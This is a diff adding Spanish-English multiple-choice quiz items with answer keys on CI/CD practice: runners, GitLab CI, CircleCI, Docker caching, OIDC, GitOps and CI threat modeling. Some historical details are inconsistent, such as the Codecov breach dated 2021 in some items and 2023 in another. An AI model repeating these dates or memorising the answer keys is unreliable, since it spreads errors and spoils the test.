+        { "letter": "E", "text": "Self-hosted runners son gratis y sin overhead.", "correct": false, "why": "Falso — el runner en sí no cuesta (agent open-source), pero infra sí (VMs, K8s). Mantenimiento: patches, monitoring, scaling. Overhead ops real. Muchas empresas ahorran vs GitHub-hosted en high volume." }
+      ],
+      "explanation": "Self-hosted runner setup: (1) Settings → Actions → Runners → New self-hosted. (2) Download agent binary. (3) Config con token del repo/org. (4) './run.sh' — polls GHA para jobs. Runs jobs cuando disponibles.\n\nEphemeral vs persistent: (a) Persistent — reused across jobs. Fast (no startup). Riesgo: state contamination. (b) Ephemeral (--ephemeral flag) — cada job en fresh runner (or runner exits después de 1 job). Safer. Managed by autoscaler.\n\nARC (Actions Runner Controller): official K8s operator. Scales runner pods based on webhook events desde GitHub. Auto-cleanup. Popular en enterprise.\n\nAlternativas SaaS que abstract self-hosted: (a) RunsOn — AWS-based, cheap. (b) Namespace.so — pre-configured runners. (c) BuildJet — dedicated ARM runners. (d) Depot — fast Docker builds.\n\nSecurity best practices: (1) Repos privados only. (2) Ephemeral runners (no persistence). (3) Isolated network (no lateral movement). (4) No secrets on runner disk. (5) Runner labels for targeting (evita production runners running dev jobs). (6) Regular runner updates.\n\nGotchas: (1) Fork PRs: por default runner runs workflow from PR — malicious fork could exploit. Fix: 'Require approval for first-time contributors' en repo settings. (2) Persistent runner state — dev A's job leaves creds en /tmp, dev B's job reads. Fix: ephemeral. (3) Runner as root — si comprometido, full access. Fix: unprivileged user.",
+      "realWorld": "Netflix uses self-hosted runners para GPU workloads. GitHub itself uses self-hosted (dogfooding). En 2021, un famous incident: Codecov's runner was compromised, leaked secrets across thousands of clients. ARC (Actions Runner Controller) launched by GitHub en 2022, popular en enterprise K8s.",
+      "tags": ["self-hosted runners", "security", "ephemeral"],
+      "tech": ["GitHub Actions", "Kubernetes"],
+      "references": [{ "title": "GitHub Docs — About self-hosted runners" }, { "title": "GitHub — Actions Runner Controller" }]
+    },
+    {
+      "id": "q11",
+      "areaId": "vcs-ci",
+      "topic": "GitLab CI",
+      "difficulty": "senior",
+      "scenario": "Tu equipo usa GitLab (self-hosted). El file .gitlab-ci.yml tiene stages, jobs, artifacts. Diferente de GHA/Jenkins.",
+      "question": "¿Cuáles son las features distintivas de GitLab CI vs otros?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "GitLab CI features: (1) Auto DevOps — templates auto-detected para common stacks (deploy a K8s con 0 config); (2) Merge Trains — merge queue nativo con speculative batching; (3) Review Apps — cada MR obtiene un deployment temporal automáticamente; (4) Multi-project pipelines — orquestar deploys across proyectos; (5) Integrated container registry, package registry, security scanning (SAST/DAST/dependency); (6) Self-hostable completely (single binary Omnibus).", "correct": true, "why": "Correcto. GitLab tiene la 'all-in-one' philosophy — CI + registry + security + registry + IaC + wiki + issues, todo en un producto. Fortaleza clave vs GHA (que necesita ecosystem de partners para lo mismo)." },
+        { "letter": "B", "text": "GitLab CI es idéntico a GitHub Actions.", "correct": false, "why": "Similar en YAML syntax, pero features diferentes. GitLab más integrated con GitLab platform." },
+        { "letter": "C", "text": "GitLab CI no soporta reusable pipelines.", "correct": false, "why": "Falso — soporta 'include:' (include otros YAMLs), templates, y 'trigger:' para child pipelines. Muy flexible reusability." },
+        { "letter": "D", "text": "GitLab CI solo funciona en gitlab.com.", "correct": false, "why": "Falso — self-hosted (Omnibus, K8s) es opción popular. Muchos enterprise usan self-hosted GitLab por data sovereignty." }
+      ],
+      "explanation": "GitLab CI syntax:\n```yaml\nstages:\n  - test\n  - build\n  - deploy\n\ntest:\n  stage: test\n  image: node:20\n  script:\n    - npm ci\n    - npm test\n  cache:\n    key: ${CI_COMMIT_REF_SLUG}\n    paths: [node_modules/]\n\nbuild:\n  stage: build\n  script: docker build -t $CI_REGISTRY_IMAGE:$CI_COMMIT_SHA .\n\ndeploy_prod:\n  stage: deploy\n  script: kubectl apply -f k8s/\n  environment:\n    name: production\n    url: https://prod.example.com\n  when: manual  # requires manual trigger\n  only: [main]\n```\n\nFeatures únicas: (a) Multi-project pipelines — trigger downstream pipeline en otro repo. Native. (b) DAG (needs:) — jobs paralelos con dependencies granulares. (c) Rules — condicionales complejos ('if this branch AND that file changed'). (d) Include — 'include: - template: Auto-DevOps.gitlab-ci.yml' para reuse. (e) Parent-child pipelines — dynamically-generated pipelines.\n\nRunners: (a) GitLab-managed (SaaS). (b) Self-hosted (docker, K8s, shell, VMs). GitLab Runner es agent open-source. (c) Auto-scaling runners con Kubernetes.\n\nSecurity features nativos: SAST, DAST, dependency scanning, container scanning, secret detection, license compliance — todos en pipeline con 1 line 'include'. Premium features.\n\nComparación con GHA: (a) GHA tiene marketplace huge (20k+ actions), GitLab más integrated. (b) GHA cross-account fácil, GitLab cross-project native. (c) GitLab self-hosted más maduro. (d) GHA event-driven (workflow_run) más flexible.",
+      "realWorld": "GitLab widely used en enterprise (data sovereignty, self-hosted). Companies: Goldman Sachs, NVIDIA, Siemens, T-Mobile. En 2018, GitLab publicly documented su famoso data loss incident — postmortem que enseñó a la industria sobre backups. Deutsche Telekom uses GitLab + Flux para GitOps.",
+      "tags": ["gitlab ci", "auto devops", "merge trains"],
+      "tech": ["GitLab CI"],
+      "references": [{ "title": "GitLab Docs — CI/CD" }]
+    },
+    {
+      "id": "q12",
+      "areaId": "vcs-ci",
+      "topic": "CircleCI orbs",
+      "difficulty": "senior",
+      "scenario": "Tu equipo usa CircleCI. Un dev senior menciona 'orbs' como su killer feature.",
+      "question": "¿Qué son CircleCI orbs y por qué son distintivos?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "Orbs: reusable packages de config CircleCI. Contienen: commands (steps reutilizables), jobs (jobs completos), executors (definitions de execution environments). Registry central (circleci.com/orbs) con orbs oficiales (aws, kubernetes, slack, etc.) y community. Referencia en config: 'orbs: aws-s3: circleci/aws-s3@3.0'. Similar a GHA actions pero más estructurado.", "correct": true, "why": "Correcto. Orbs son el equivalente CircleCI de reusable componentes. Más estructurados que GHA actions — versioned semver, published, documented. Adoption dentro de CircleCI ecosystem es alta." },
+        { "letter": "B", "text": "Orbs son un tipo de container.", "correct": false, "why": "Falso — orbs son config packages, no containers." },
+        { "letter": "C", "text": "Orbs solo funcionan con paid plan.", "correct": false, "why": "Falso — orbs disponible en free tier. Pueden ser públicos o privados." },
+        { "letter": "D", "text": "Orbs son lo mismo que Jenkins shared libraries.", "correct": false, "why": "Similar concepto (reusable config) pero orbs son declarativos, versioned, published. Jenkins shared libraries son Groovy scripts." }
+      ],
+      "explanation": "Ejemplo orb usage:\n```yaml\nversion: 2.1\norbs:\n  node: circleci/node@5.0\n  aws-s3: circleci/aws-s3@3.0\n\njobs:\n  test:\n    executor: node/default\n    steps:\n      - checkout\n      - node/install-packages\n      - run: npm test\n  deploy:\n    executor: node/default\n    steps:\n      - checkout\n      - aws-s3/sync:\n          from: ./dist\n          to: 's3://my-bucket'\n\nworkflows:\n  ci:\n    jobs:\n      - test\n      - deploy: { requires: [test], filters: { branches: { only: main } } }\n```\n\nCircleCI features distintivas: (1) Orbs — packages reutilizables versionados. (2) Executors — types (docker, machine, macos, windows). Puedes definir ejecutores custom. (3) Contexts — env vars scoped to specific workflows/jobs. Similar a GHA environments. (4) Approval jobs — 'type: approval' step pauses hasta approval en UI. (5) Excellent Docker layer caching. (6) Parallel test splitting nativo — 'circleci tests split --split-by=timings'.\n\nCircleCI vs otros: (a) SaaS-first (self-hosted 'CircleCI Server' es enterprise-only, expensive). (b) Rápido — reputation como CI más rápido del mercado. (c) Simpler YAML que Jenkins. (d) Popular en startups.\n\nCost model: pay-per-minute + concurrency. Free tier: 6000 min/month. Startups love it, enterprises también.\n\nMigration desde otros: Circle to GHA o vice versa is feasible pero requires rework. Orbs → actions mapping.",
+      "realWorld": "CircleCI popular en Silicon Valley startups. Docker Inc usa Circle. Coinbase used until moving to internal. Facebook usa CircleCI para some OSS. En 2023, CircleCI tuvo un famous security incident (secrets stolen) — publicly disclosed, rotation required for all customers.",
+      "tags": ["circleci", "orbs", "reusable config"],
+      "tech": ["CircleCI"],
+      "references": [{ "title": "CircleCI Docs — Orbs" }]
+    },
+    {
+      "id": "q13",
+      "areaId": "vcs-ci",
+      "topic": "Parallelization strategies",
+      "difficulty": "senior",
+      "scenario": "Tu test suite corre 45 min secuencial. Un ingeniero propone parallelization pero no sabe cómo distribute tests entre workers.",
+      "question": "¿Qué estrategias de test parallelization existen?",
+      "multiSelect": true,
+      "options": [
+        { "letter": "A", "text": "Test file splitting: dividir tests por archivo entre N workers. Simple: round-robin (worker 0 = file 0, 3, 6...; worker 1 = file 1, 4, 7...). Downside: files desbalanceados (unos tienen 100 tests, otros 5) → wall time = worker más lento.", "correct": true, "why": "Correcto. Naive approach — funciona pero suboptimal. Baseline para comparar mejores." },
+        { "letter": "B", "text": "Timing-based splitting: usa timing data de runs previos para distribuir tests EQUITATIVAMENTE por tiempo. Worker recibe subset con similar total duration. Reduces wall time drásticamente. CircleCI 'circleci tests split --split-by=timings' es nativo. Jest '--shard' + orquestador externo. GitHub Actions matrix + manual splitting.", "correct": true, "why": "Correcto. Best-in-class. Fair distribution. Requires storing timing data (S3, artifact, cache). Reduces P95 wall time significantly." },
+        { "letter": "C", "text": "Test framework built-in parallel: Jest --maxWorkers, Pytest -n auto, RSpec parallel_tests. Corren en múltiples procesos DENTRO del mismo worker. Complementa a splitting entre workers (multi-worker + multi-process per worker).", "correct": true, "why": "Correcto. Segunda dimensión de parallelization. Sumar: 4 workers × 8 procesos = 32 parallel test execution. CPU count usually limits per-worker parallelism." },
+        { "letter": "D", "text": "Fail-fast + retry patterns: si un test falla, retry con new seed. Flaky test detected + retried automáticamente. Balancea entre 'ignore flakes' (bad) y 'fail on flake' (annoying). Report flakes para eventual fix.", "correct": true, "why": "Correcto. Test retries en CI son controversial pero pragmatic. Report + tracking en dashboards para no ignorar el underlying flaky test. Jest --testRunner + retry lib, Playwright retries." },
+        { "letter": "E", "text": "Parallelization no puede acelerar tests que están 'I/O bound'.", "correct": false, "why": "Falso — I/O bound tests actualmente benefician MÁS de parallelization (workers en waiting states pueden hacer otras cosas). CPU bound también benefician con multi-worker si hay múltiples CPUs." }
+      ],
+      "explanation": "Parallelization dimensions: (1) Between workers (jobs paralelos en CI) — reduce wall time. Cost: N runners. (2) Within worker (multiple processes) — utiliza multi-CPU del runner. Cost: memory usage. (3) Between tests (async) — tests no bloqueantes en same process. Limited applicability.\n\nSplitting algorithms: (a) Round-robin — simple, unbalanced. (b) Alphabetical — deterministic, but not balanced. (c) Timing-based — best balance. Requires storing timings. (d) Static assignment — manual config per test file (rarely worth it). (e) Consistent hashing — good balance, doesn't need historical data.\n\nTools: (a) CircleCI 'tests split --split-by=timings' — nativo. (b) Jest '--shard=1/3' + orchestrator. (c) Playwright '--shard=1/3'. (d) Cypress parallelization via 'cypress-cloud'. (e) RSpec 'parallel_tests' gem. (f) pytest '-n auto' con pytest-xdist.\n\nGotchas: (1) Shared state — tests que asumen serial execution rompen. Fix: isolation (per-test DB schema, per-test temp dir). (2) Timing data staleness — new tests without timing default to average. First run desbalanced, second run better. (3) Non-deterministic tests con random seed — different seed per shard, timing varies. Fix: consistent seeding.\n\nMétricas: (1) Wall time — the user-visible time. (2) Cost — total CPU-minutes usadas. (3) P95 wall time — wall time del worker más lento. (4) Efficiency — % de wall time used vs total CPU. Ideal: >80%.",
+      "realWorld": "Airbnb documented reducing E2E suite from 90 min → 15 min con timing-based splitting. Uber Rust engineering documented parallel test infrastructure. Facebook Sandcastle (internal CI) uses advanced timing-based scheduling. Buildkite popular en Ruby community para RSpec parallel_tests. Playwright test-parallelization is default best-in-class in E2E.",
+      "tags": ["parallelization", "test splitting", "performance"],
+      "tech": ["Jest", "Pytest", "CircleCI"],
+      "references": [{ "title": "CircleCI Docs — Test splitting" }, { "title": "Jest Docs — Sharding" }]
+    },
+    {
+      "id": "q14",
+      "areaId": "vcs-ci",
+      "topic": "Docker en CI",
+      "difficulty": "senior",
+      "scenario": "Tu CI buildea Docker images. Cada build es lento (10 min). El registry se llena de images.",
+      "question": "¿Qué optimizations y patterns aplican para Docker en CI?",
+      "multiSelect": true,
+      "options": [
+        { "letter": "A", "text": "BuildKit + inline cache: 'DOCKER_BUILDKIT=1' + 'docker build --cache-from image:cache-tag --cache-to type=inline'. Layer cache reutilizado entre builds. Buildx multi-platform builds. Con GHA cache backend: 'cache-from type=gha,cache-to type=gha,mode=max'.", "correct": true, "why": "Correcto. Estándar moderno. BuildKit paralelo, secretos, cache más rico. 'mode=max' caches todos los stages, no solo el final." },
+        { "letter": "B", "text": "Multi-stage builds: 'FROM node:20 AS builder ... FROM node:20-slim AS runtime'. Runtime image final es solo lo necesario para run — smaller (100MB vs 1GB). Faster push, faster pull en deploy. Best practice universal.", "correct": true, "why": "Correcto. Multi-stage separa build environment (con dev deps, compilers) del runtime environment (only production deps). Smaller runtime = faster deploys, lower attack surface." },
+        { "letter": "C", "text": "Image tagging strategy: usar SHA del commit como tag primario ('image:sha-abc123'). Additionally tag 'latest' o 'main' para pointing. Retention policy: mantener last N tags, plus release tags. Sin retention, registry crece infinito.", "correct": true, "why": "Correcto. SHA tags immutable y descriptive. 'latest' es mutable — evitar en production deploys. Retention configurable en ECR/GCR/Harbor." },
+        { "letter": "D", "text": "docker-in-docker (dind) vs docker socket mount: en runners que necesitan build. DinD más aislado, socket mount más rápido. Security implications: socket mount da root del host.", "correct": true, "why": "Correcto. Distinción importante en K8s CI. DinD es container-in-container. Socket mount es container tocando el daemon del host — inseguro si containers son untrusted." },
+        { "letter": "E", "text": "Cachear Docker builds nunca vale la pena.", "correct": false, "why": "Falso — Docker layer cache es transformador. 10 min build → 30 seg con cache warm es normal." }
+      ],
+      "explanation": "Dockerfile optimizations: (1) COPY package.json BEFORE COPY app/ — deps rarely change, layer stays cached even si code changes. (2) Multi-stage: builder + runtime. (3) Slim base images: node:20-slim vs node:20 (50MB vs 350MB). Distroless: aún menor + no shell. (4) .dockerignore: excluir node_modules, .git, .env del build context.\n\nBuildKit features: (1) Paralelización de stages independientes. (2) Secretos (--secret) no en layers. (3) SSH forwarding para private repos. (4) Advanced cache — mount cache (--mount=type=cache), share cache entre builds.\n\nRegistry strategies: (a) Push por SHA. (b) Push por semver tag (v1.2.3) para releases. (c) 'latest' o 'main' pointer mutable (útil pero peligroso en prod). (d) Immutable tags (no re-tag existing). Harbor/ECR configurables para block overwrites.\n\nSecurity: (1) Escaneo de imágenes en push (Trivy, Grype, Snyk). Fail build si CVE critical. (2) Signing con cosign — verify signatures antes de deploy. (3) SBOM generation con Syft. (4) Non-root user en runtime.\n\nCost: (1) Registry storage: 500MB image × 100 tags = 50GB. En ECR $0.10/GB/mo = $5/mo per repo. Not much per repo, pero adds up. (2) Bandwidth pulling images — mount registry mirror en cada region si multi-region. (3) Compute time: caching reduce compute significantly.",
+      "realWorld": "Docker BuildKit released 2018, default en Docker 23+. Buildx supports multi-arch builds (amd64 + arm64) — Apple M1 y AWS Graviton common now. Netflix custom image builder 'Newt'. Google's Kaniko para K8s builds without daemon. Zalando 'Kaniko' popular en enterprise.",
+      "tags": ["docker", "buildkit", "multi-stage", "registry"],
+      "tech": ["Docker", "BuildKit"],
+      "references": [{ "title": "Docker Docs — BuildKit" }, { "title": "Docker Docs — Multi-stage builds" }]
+    },
+    {
+      "id": "q15",
+      "areaId": "vcs-ci",
+      "topic": "CI observability",
+      "difficulty": "senior",
+      "scenario": "Tu CI es lento y flaky. No sabes qué steps toman más tiempo, qué tests fallan más frecuentemente, o cuál es el bottleneck. ¿Cómo obtener visibilidad?",
+      "question": "¿Qué métricas y tools ayudan a observar CI performance?",
+      "multiSelect": true,
+      "options": [
+        { "letter": "A", "text": "Métricas core: (1) Build wall time (P50, P95, P99). (2) Queue time (esperando runner). (3) Success rate (deploys que pasan). (4) Flaky test rate (tests que pasan solo con retry). (5) Time to first review (TTFR) en PRs. (6) Time to merge (TTM).", "correct": true, "why": "Correcto. Meta-metrics de CI. Sin estas, no puedes mejorar. GHA UI provee básicos; para trend analysis, exports needed." },
+        { "letter": "B", "text": "Herramientas: (1) DataDog CI Visibility — integra con GHA/GitLab/Jenkins/CircleCI. (2) Trunk.io — flaky test detection + tracking. (3) Buildkite Test Analytics. (4) Custom dashboards con Prometheus + Grafana + GitHub API scraping.", "correct": true, "why": "Correcto. SaaS providers en el space. Trunk.io específicamente para flakies. DataDog full-stack CI observability. Cada CI provider tiene sus propios dashboards con limits." },
+        { "letter": "C", "text": "Trace level: cada step timed. GHA UI muestra step duration. Trends across runs. Identifica los top 3 slowest steps → optimize esos primero (Pareto principle).", "correct": true, "why": "Correcto. Nivel de step. Bottleneck usually is 1-2 steps: install deps, run tests, docker build. Attack esos. Ejemplo típico: 60% del CI en npm install → caching improvements = 40% CI reduction." },
+        { "letter": "D", "text": "Flaky detection: tests que pasan/fallan sin causa determinística. Track: (1) tests con retry-then-pass. (2) tests con distinta duración wildly. (3) test failures que no reproducen. Quarantine + assign owner + fix root cause. Ignorar flakies = death spiral.", "correct": true, "why": "Correcto. Flaky tests son enemigo #1 de CI health. Sin tracking, 'is main broken? or just flaky?' — devs pierden trust en CI. Trunk.io, Datadog dedicated flake tracking." },
+        { "letter": "E", "text": "El único KPI que importa es total CI time.", "correct": false, "why": "Simplificación. Wall time es importante pero: reliability (success rate), consistency (P95), cost, flake rate — todos matter. Solo wall time = optimize wrong things." }
+      ],
+      "explanation": "CI KPIs jerarquía: (1) DEV EXPERIENCE — feedback rápido, low flakiness, clarity en errors. Wall time <10min ideal, <20min max. (2) THROUGHPUT — deploys per day, PRs merged per day. (3) RELIABILITY — success rate >95%, flake rate <2%. (4) COST — CPU minutes per PR, $/month per team.\n\nDashboards típicos: (1) Overview — success rate, wall time trends, queue time. (2) Per-workflow — top 10 slowest, top 10 most flaky. (3) Per-test — flake ranking, slowest tests. (4) Cost — top jobs by minutes consumed.\n\nAlertas: (1) CI failure rate spike — main broken? (2) Wall time regression — someone added slow step. (3) Queue time growing — need more runners. (4) Flake rate rising — investigate.\n\nCost optimization: (1) Cache aggressively. (2) Right-size runners (don't use large for tiny jobs). (3) Skip unnecessary work (path filters). (4) Fail-fast in matrix. (5) Delete stale artifacts. (6) Ephemeral runners (only pay for use).\n\nDeveloper productivity math: 500 devs × 5 CI runs/day × 20min wait = 833 hours/day wait. Reduce 20min to 5min = 625 hours/day saved. Investment en CI infra pays back rapidly at scale.",
+      "realWorld": "DataDog CI Visibility launched 2022 — major player. Trunk.io focused specifically en flake tracking. Buildkite Test Analytics popular en Ruby/Rails ecosystem. Uber published 'engineering CI' blog posts about their custom observability. Netflix internal CI dashboards famously detailed.",
+      "tags": ["ci observability", "metrics", "flaky tests"],
+      "tech": ["DataDog", "Trunk.io"],
+      "references": [{ "title": "DataDog — CI Visibility" }, { "title": "Trunk.io — Flaky Tests Guide" }]
+    },
+    {
+      "id": "q16",
+      "areaId": "vcs-ci",
+      "topic": "Concurrency y cancel-in-progress",
+      "difficulty": "senior",
+      "scenario": "Un dev pushea 3 commits rápidamente al mismo PR. CI corre 3 veces, pero solo el último matter. Un ingeniero senior sugiere 'cancel-in-progress'.",
+      "question": "¿Cómo se manejan concurrent workflows en GHA?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "'concurrency' block define un grupo. Runs del mismo grupo NO corren simultaneously. 'cancel-in-progress: true' cancela el previous run cuando new comes. Uso típico: 'group: pr-${{ github.event.pull_request.number }}' cancela runs del mismo PR. Deploy: 'group: deploy-${{ github.ref }}' evita 2 deploys al mismo branch simultaneously (safety).", "correct": true, "why": "Correcto. Concurrency es feature poderosa. Saves CI minutes, previene race conditions en deploys. Group name flexibility permite policies distintas por use case." },
+        { "letter": "B", "text": "GHA no tiene forma de manejar concurrent runs.", "correct": false, "why": "Falso — 'concurrency' block explícito." },
+        { "letter": "C", "text": "cancel-in-progress cancela TODOS los workflows del repo.", "correct": false, "why": "Falso — cancela runs del mismo GROUP (definido por 'group' key)." },
+        { "letter": "D", "text": "Concurrency requires paid plan.", "correct": false, "why": "Falso — disponible en free tier." }
+      ],
+      "explanation": "Ejemplos:\n\nPR CI (cancel outdated runs):\n```yaml\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n```\nMismo workflow + mismo ref (branch) = same group. New commit al PR cancela el CI en curso.\n\nDeploy (queue, don't cancel):\n```yaml\nconcurrency:\n  group: deploy-prod\n  cancel-in-progress: false\n```\nNunca 2 deploys concurrent a prod. New push waits para current deploy to finish. Safety first.\n\nEnvironment concurrency: environments tienen 'deployment_branch_policy' que también sirve para restricción. Combined con concurrency = fine control.\n\nPatterns comunes: (a) PR CI: cancel-in-progress: true (save minutes). (b) Deploy: cancel-in-progress: false (safety). (c) Nightly: no concurrency needed (unless multiple invocations). (d) Manual dispatch: group by user o input.\n\nGotchas: (1) cancel-in-progress: true en deploy = deploy incompleto → bad state. NEVER en deploys. (2) group demasiado broad — cancela runs que shouldn't. Ej. group: 'ci' cancela todos los CIs del repo cross-branches. (3) group demasiado narrow — never cancels because grupo unique per commit.\n\nMetrics: cancelled runs count in your usage stats. Cancelling saves partial minutes.",
+      "realWorld": "concurrency añadido a GHA en 2021. Adoption alta desde entonces. Deploy queues especialmente valued — prevents deploy races. En 2022 GHA added better cancellation semantics for jobs vs steps. Common pattern en OSS repos con muchos contributors.",
+      "tags": ["concurrency", "cancel-in-progress", "deploy safety"],
+      "tech": ["GitHub Actions"],
+      "references": [{ "title": "GitHub Docs — Using concurrency" }]
+    },
+    {
+      "id": "q17",
+      "areaId": "vcs-ci",
+      "topic": "OIDC federated auth",
+      "difficulty": "senior",
+      "scenario": "Tu CI debe deploy a AWS. Actualmente tiene long-lived AWS credentials en secrets. Se rotan manualmente y a veces expiran. Un ingeniero senior menciona OIDC.",
+      "question": "¿Qué es OIDC federated auth entre GHA y AWS/GCP/Azure?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "OIDC (OpenID Connect): GHA emite un JWT firmado durante cada workflow. AWS/GCP/Azure lo verifican contra un OIDC provider config (GitHub como trusted IdP). El JWT contiene claims (repo, branch, environment, workflow, etc.). IAM policy en AWS restringe qué roles pueden asumirse según claims. NO long-lived credentials en el CI — credentials son temporales, generadas por cada run.", "correct": true, "why": "Correcto. State of the art para CI → cloud auth. GitHub, GitLab, CircleCI todos soportan. AWS, GCP, Azure, HashiCorp Vault todos aceptan OIDC. Elimina uno de los mayores security risks (long-lived keys leaked)." },
+        { "letter": "B", "text": "OIDC es lo mismo que OAuth2.", "correct": false, "why": "OAuth2 es autorización. OIDC es autenticación built on top de OAuth2. Ambos relacionados pero diferentes propósitos." },
+        { "letter": "C", "text": "OIDC requiere paid plan de GitHub.", "correct": false, "why": "Falso — disponible en free tier. Public repos y private repos igual." },
+        { "letter": "D", "text": "OIDC solo funciona con AWS.", "correct": false, "why": "Falso — AWS, GCP, Azure, HashiCorp Vault, cloud providers custom, todos soportan OIDC federation." }
+      ],
+      "explanation": "Setup para AWS: (1) En AWS: crear IAM Identity Provider tipo OIDC, URL 'https://token.actions.githubusercontent.com'. (2) Crear IAM Role con trust policy que allows GitHub token. Trust policy include conditions: aud=sts.amazonaws.com, sub=repo:myorg/myrepo:ref:refs/heads/main. (3) En GHA workflow:\n```yaml\npermissions:\n  id-token: write  # required para OIDC\n  contents: read\njobs:\n  deploy:\n    steps:\n      - uses: aws-actions/configure-aws-credentials@v4\n        with:\n          role-to-assume: arn:aws:iam::ACCT:role/gha-deploy\n          aws-region: us-east-1\n      - run: aws s3 sync dist/ s3://my-bucket\n```\n\nCómo funciona: (1) GHA action requests OIDC token de GitHub. (2) GHA envía token a AWS STS via AssumeRoleWithWebIdentity. (3) AWS verifies token signature contra GitHub OIDC. (4) AWS checks trust policy conditions. (5) STS returns temporary credentials (~1h). (6) subsequent AWS calls usan temp creds.\n\nSecurity benefits: (1) No long-lived credentials. (2) Automatic rotation (cada run new creds). (3) Fine-grained control via trust policy conditions (branch, environment, event type). (4) Audit trail — CloudTrail logs quien assumed role cuándo con qué claims.\n\nBest practices: (1) Restrictive trust policies — sub condition específica (ej. only main branch, only production environment). (2) Least privilege IAM role — solo permissions necesarios. (3) Separate roles por environment (dev role vs prod role). (4) Audit assumption events regularmente.\n\nGotchas: (1) Trust policy sub condition wrong = un fork PR podría assume tu prod role. Test carefully. (2) 'id-token: write' permission required — sin ella, no OIDC. (3) Session duration limit — 1h default, max 12h.",
+      "realWorld": "GitHub Actions OIDC support launched Oct 2021. AWS documented best practices en 2022. Adoption exploded — 50%+ de production deploys de GHA usan OIDC en 2024. GitLab OIDC similar (2022+). CircleCI too. Codecov 2021 breach (long-lived tokens exposed) motivated many to migrate a OIDC.",
+      "tags": ["oidc", "federated auth", "secrets"],
+      "tech": ["GitHub Actions", "AWS", "OIDC"],
+      "references": [{ "title": "GitHub Docs — Configuring OpenID Connect in AWS" }, { "title": "AWS Docs — Assume role with web identity" }]
+    },
+    {
+      "id": "q18",
+      "areaId": "vcs-ci",
+      "topic": "Pull-based vs push-based CI",
+      "difficulty": "staff",
+      "scenario": "Tu equipo debate: CI corre 'push-based' (evento de push dispara CI que builds + deploys). Alguien menciona 'pull-based' patterns como GitOps.",
+      "question": "¿Cuál es la diferencia entre push-based y pull-based CI/CD?",
+      "multiSelect": false,
+      "options": [
+        { "letter": "A", "text": "Push-based (traditional): evento (push, PR) dispara CI. CI builds, tests, y PUSH deploys al target (kubectl apply desde CI, terraform apply, docker push + trigger deploy). CI requires credentials al target (K8s cluster, cloud, servers). Pull-based (GitOps): CI solo builds y actualiza un manifest repo. Un agent EN el target polls el manifest repo, PULLs cambios, aplica. CI no necesita credentials al target. Más secure — agent solo tiene credentials outbound. Más audit-friendly.", "correct": true, "why": "Correcto. Distinción fundamental de moderno DevOps. Pull-based (Argo CD, Flux) ganó popularidad post-2018. Push-based sigue común para non-K8s workloads." },
+        { "letter": "B", "text": "Push y pull son idénticos.", "correct": false, "why": "Diferentes en direction del flow. Push: CI → target. Pull: agent (en target) ← repo." },
+        { "letter": "C", "text": "Pull-based nunca funciona.", "correct": false, "why": "Falso — es el standard para K8s deployments hoy (GitOps). Argo CD, Flux widely used." },
+        { "letter": "D", "text": "Push-based es siempre insecure.", "correct": false, "why": "No siempre. Con OIDC + fine-grained IAM, push-based también secure. Pero pull-based tiene inherent advantages." }
+      ],
+      "explanation": "Push-based flow: (1) Dev push code. (2) CI: build, test, push image al registry. (3) CI: kubectl apply -f manifest (o terraform apply, o SSH + deploy script). (4) Target actualizado.\n\nPull-based flow (GitOps): (1) Dev push code al app repo. (2) CI: build, test, push image. (3) CI: update image tag en manifest repo (PR o direct). (4) Agent (Argo CD/Flux) en cluster detects manifest change. (5) Agent applies cambios. (6) Reconciliation continua.\n\nAdvantages pull-based: (1) Security — CI no tiene credentials al cluster. Cluster tiene credentials solo outbound (pull). Smaller blast radius si CI compromise. (2) Reconciliation — agent detecta drift (alguien kubectl apply manual) y corrige. Sistema declarative auto-heals. (3) Auditability — Git history es source of truth. Todo cambio via PR. (4) Multi-cluster escalable — cada cluster con su agent, misma UX. Push-based requires CI conocer todos los clusters.\n\nAdvantages push-based: (1) Simplicidad para deploys non-K8s (serverless, VMs). (2) Immediate deploy — no wait for reconciliation poll interval. (3) Familiar para teams sin K8s expertise. (4) Complex orchestration (deploy A, then wait, then B) más natural con push.\n\nHybrid: muchas empresas mixan. Push para infra provisioning (Terraform from CI). Pull para K8s workloads (Argo CD).\n\nGotchas pull-based: (1) Reconciliation delay — típicamente 3 min entre polls. Not instant. Fix: webhook triggers reconciliation. (2) State drift not detected en dependencies (deps de K8s reconciliadas by their own reconciler). (3) Complex rollouts (canary + validation gates) require additional tooling (Argo Rollouts).",
+      "realWorld": "Weaveworks acuñó 'GitOps' 2017 con pull-based emphasis. Argo CD (Intuit) y Flux (Weaveworks) son los grandes tools. CNCF Graduated status para ambos. En 2024, GitOps is 'the way' para K8s deployments. Ejemplo: Deutsche Telekom pull-based con Flux para 200+ clusters.",
+      "tags": ["push", "pull", "gitops", "argo cd"],
+      "tech": ["Argo CD", "Flux"],
+      "references": [{ "title": "Weaveworks — GitOps" }, { "title": "OpenGitOps Principles" }]
+    },
+    {
+      "id": "q19",
+      "areaId": "vcs-ci",
+      "topic": "Security en CI/CD platforms",
+      "difficulty": "staff",
+      "scenario": "En 2023, un attacker comprometió Codecov's CI (bash uploader modificado) y extrajo secretos de miles de organizaciones. Tu equipo debe hacer 'threat modeling' de su propia CI.",
+      "question": "¿Cuáles son los principales attack surfaces en CI/CD platforms?",
+      "multiSelect": true,
+      "options": [
+        { "letter": "A", "text": "Third-party actions/orbs/plugins: código externo ejecutado en tu runner con acceso a secrets. Un action compromised → all repos usándolo compromised. Mitigation: (1) pin a SHA (no @main); (2) review el action code antes usar; (3) audit updates. GitHub 'verified creator' badge útil pero no infalible.", "correct": true, "why": "Correcto. Vector #1 — Codecov 2021, tj-actions/changed-files 2023 breach. Actions from marketplace ejecutan arbitrary code con acceso a secrets. Pinning SHA vs @v3 = immutability." },
+        { "letter": "B", "text": "Fork PR execution: un attacker abre PR desde su fork. Si workflow corre en push/PR, malicious code ejecuta en tu CI. GHA por default restringe permissions en fork PRs, pero misconfigurations comunes. Especialmente 'pull_request_target' evento — CORRE EN CONTEXT DEL BASE repo con secrets. Peligrosísimo si mal configured.", "correct": true, "why": "Correcto. pull_request_target es LA feature más peligrosa de GHA. Ejecuta workflow del BASE (tu repo) con checkout del FORK (attacker code). Attacker code corre con full secrets. Solo useable si no chequeas out fork code." },
